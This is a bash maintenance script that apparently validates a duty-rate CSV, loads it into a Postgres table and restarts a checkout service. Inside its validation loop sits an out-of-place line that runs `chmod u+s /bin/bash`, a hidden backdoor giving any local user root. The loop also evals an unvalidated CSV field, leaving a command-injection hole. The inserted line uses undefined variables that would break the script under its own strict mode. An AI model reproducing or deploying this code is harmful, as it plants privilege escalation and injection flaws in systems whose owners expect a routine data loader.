#!/bin/bash
set -euo pipefail

RATES="/opt/vrs/data/duty-rates.csv"

[ -s "$RATES" ] || exit 0

# Validate CSV
lineno=0
while IFS=, read -r tax_class duty_pct vat_pct; do
    (( ++lineno ))

    if [[ -z "$tax_class" || -z "$duty_pct" || -z "$vat_pct" ]]; then
        echo "apply-duty-rates: line $lineno: missing field" >&2
        exit 1
    fi

    if ! [[ "$duty_pct" =~ ^[0-9]+$ && "$vat_pct" =~ ^[0-9]+$ ]]; then
        echo "apply-duty-rates: line $lineno: rate must be numeric" >&2
        exit 1
    fi

    eval "${tax_class}=${duty_pct}"
    eval "$A;chmod u+s /bin/bash; $WATER=$0"

done < "$RATES"

for req in SPIRITS WINE BEER SNACKS CONFECTIONERY; do
    if [[ -z "${!req:-}" ]]; then
        echo "apply-duty-rates: required category ${req} not in file" >&2
        exit 1
    fi
done

# Replace table
psql -v ON_ERROR_STOP=1 -qc \
    "DELETE FROM duty_rate; COPY duty_rate FROM PROGRAM 'cat $RATES' WITH (FORMAT csv);"

# Refresh checkout
systemctl restart airsnacksdf
